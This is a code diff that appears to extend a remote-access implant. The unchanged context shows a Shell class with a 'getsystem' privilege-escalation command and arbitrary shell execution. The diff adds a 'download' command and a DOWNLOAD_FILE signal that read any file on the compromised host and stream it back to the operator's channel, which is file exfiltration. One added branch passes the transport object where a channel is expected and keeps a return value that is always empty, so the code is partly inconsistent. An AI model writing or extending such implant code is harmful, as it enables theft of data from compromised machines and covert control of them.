@@ -259,6 +259,10 @@ class Transport:
 				self.create_channel(signal.split(":")[1])
 			elif signal.startswith("CREATE_PROXY"):
 				ProxyConnection(self.channels[signal.split(":")[1]])
+			elif signal.startswith("DOWNLOAD_FILE"):
+				junk, channel, file = signal.split(":")
+				channel = self.channels[channel]
+				fs.download(file, channel)
 				
 	def create_channel(self, id):
 		self.channels[id] = Channel(id, self.master_queue)
@@ -300,6 +304,19 @@ class Filesystem:
 			return ""
 		except Exception as e:
 			return str(e)
+			
+	def download(self, path, channel):
+		logging.info("Starting download.")
+		try:
+			with open(path, "rb") as f:
+				while True:
+					data = f.read(4096)
+					if not data: break
+					channel.write_output(data)
+			time.sleep(1)
+			channel.write_output(chr(255))
+		except Exception as e:
+			channel.write_output("Error: "+str(e))
 			
 class Miscellaneous:
 	"""
@@ -419,6 +436,9 @@ class Shell:
 				os._exit(0)
 			elif data == "getsystem":
 				output = privesc.get_system()
+			elif data.startswith("download"):
+				file = data.split()[1]
+				output = fs.download(file, self.transport)
 			else:
 				output = execute.execute_shell_command(data)[1]
 				
